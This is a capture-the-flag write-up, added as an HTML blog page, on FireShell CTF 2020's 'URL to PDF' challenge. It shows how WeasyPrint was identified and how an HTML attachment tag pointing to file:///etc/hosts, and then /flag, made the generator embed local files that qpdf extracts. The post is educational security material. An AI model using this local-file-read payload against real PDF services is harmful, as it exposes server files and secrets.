@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Challenge based on the talk Owning the clout through SSRF and PDF generators.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Solving URL to PDF from FireShell CTF 2020">
+<meta property="og:url" content="http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/">
+<meta property="og:site_name" content="securitytaters">
+<meta property="og:description" content="Challenge based on the talk Owning the clout through SSRF and PDF generators.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/8.1.jpg">
+<meta property="og:image" content="http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/8.2.jpg">
+<meta property="article:published_time" content="2020-03-23T04:30:00.000Z">
+<meta property="article:modified_time" content="2025-08-10T09:24:46.803Z">
+<meta property="article:author" content="0xm4v3rick">
+<meta property="article:tag" content="webappsec">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="file read">
+<meta property="article:tag" content="PDF generators">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/8.1.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Solving URL to PDF from FireShell CTF 2020</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/securitytaters">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/solving-screenshoter-from-fireshell-ctf-2020/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/solving-chatt-with-bratt-from-utctf-2020/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/&text=Solving URL to PDF from FireShell CTF 2020"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/&title=Solving URL to PDF from FireShell CTF 2020"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/&is_video=false&description=Solving URL to PDF from FireShell CTF 2020"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Solving URL to PDF from FireShell CTF 2020&body=Check out this article: http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/&title=Solving URL to PDF from FireShell CTF 2020"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/&title=Solving URL to PDF from FireShell CTF 2020"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/&title=Solving URL to PDF from FireShell CTF 2020"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/&title=Solving URL to PDF from FireShell CTF 2020"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/&name=Solving URL to PDF from FireShell CTF 2020&description=Challenge based on the talk Owning the clout through SSRF and PDF generators."><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/&t=Solving URL to PDF from FireShell CTF 2020"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Solving URL to PDF from FireShell CTF 2020
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+	<p>Author : 
+        <span class="p-name" itemprop="name">0xm4v3rick</span>
+	</p>
+      </span>
+      
+    <div class="postdate">
+      
+        Created: <time datetime="2020-03-23T04:30:00.000Z" class="dt-published" itemprop="datePublished">23-03-2020</time>
+        
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/PDF-generators/" rel="tag">PDF generators</a>, <a class="p-category" href="/tags/file-read/" rel="tag">file read</a>, <a class="p-category" href="/tags/webappsec/" rel="tag">webappsec</a>, <a class="p-category" href="/tags/writeup/" rel="tag">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>The URL to PDF from FireShell CTF 2020 challenge note:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Please test our brand new service.</span><br><span class="line"></span><br><span class="line">flag is on /flag</span><br><span class="line"></span><br><span class="line">https://urltopdf.fireshellsecurity.team/</span><br></pre></td></tr></table></figure>
+
+<p>Accessing the URL sends us to a website which converts the page at a given URL to PDF. Immediately a talk related to this comes to mind. Owning the clout through SSRF and PDF generators which highlights issues in PDF generation when inputs are not properly validated when generating PDF primarily allowing SSRF or local file read among other things.</p>
+<p>So let’s identify the PDF generator as mentioned in the talk. I am using requestbin here as usual to log requests and analyze it. </p>
+<p><img src="/solving-url-to-pdf-from-fireshell-ctf-2020/8.1.jpg" alt="alt"></p>
+<p>We see that the user agent is mentioned as WeasyPrint 51 (<a target="_blank" rel="noopener" href="http://weasyprint.org/">http://weasyprint.org/</a>) </p>
+<p><img src="/solving-url-to-pdf-from-fireshell-ctf-2020/8.2.jpg" alt="alt"></p>
+<p>Now we need to prepare a HTML page which can be provided for PDF conversion via a URL. As mentioned in the talk we will need to use <link rel=attachment href="file:///etc/passwd"> payload as part of the HTML page. I used &#x2F;etc&#x2F;hosts instead of usual passwd file. HTML page was as follows. I hosted it using filebin and provide the URL for PDF generator.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;link rel=attachment href=&quot;file:///etc/hosts&quot;&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>After downloading the PDF I needed to decode the data from PDF to readable format. Retrieving the contents was something I had to search since results are not displayed directly in the PDF but are hidden inside FlateDecode part of the PDF. The utility mentioned in the talk was not available on the internet or I couldn’t find it. After searching around for a while I found a linux utility called qpdf which I used as follows.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qpdf --qdf --object-streams=disable 1f51f044e0ca6c90d995ab9b4e2bd23c.pdf out.pdf</span><br></pre></td></tr></table></figure>
+
+<p>Reading the output pdf in text editor gave me the contents of the &#x2F;etc&#x2F;hosts as shown.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line"># Kubernetes-managed hosts file.</span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">fe00::0 ip6-mcastprefix</span><br><span class="line">fe00::1 ip6-allnodes</span><br><span class="line">fe00::2 ip6-allrouters</span><br><span class="line">10.244.0.22     url-to-pdf-8f9ddf549-prfvm</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br></pre></td></tr></table></figure>
+
+
+<p>Now replacing the &#x2F;etc&#x2F;hosts with &#x2F;flag as mentioned in the challenge note gave me the flag.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">F#&#123;th4nk5_t0_Ben_Sadeghipour_&amp;_Cody_Brocious&#125;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br></pre></td></tr></table></figure>
+
+<p>Thanks for reading. Feel free to contact me on twitter for any queries or feedback. Cheers!!!</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Archive</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/securitytaters">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/&text=Solving URL to PDF from FireShell CTF 2020"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/&title=Solving URL to PDF from FireShell CTF 2020"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/&is_video=false&description=Solving URL to PDF from FireShell CTF 2020"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Solving URL to PDF from FireShell CTF 2020&body=Check out this article: http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/&title=Solving URL to PDF from FireShell CTF 2020"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/&title=Solving URL to PDF from FireShell CTF 2020"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/&title=Solving URL to PDF from FireShell CTF 2020"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/&title=Solving URL to PDF from FireShell CTF 2020"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/&name=Solving URL to PDF from FireShell CTF 2020&description=Challenge based on the talk Owning the clout through SSRF and PDF generators."><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://securitytaters.github.io/solving-url-to-pdf-from-fireshell-ctf-2020/&t=Solving URL to PDF from FireShell CTF 2020"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2025
+    0xm4v3rick
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/securitytaters">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
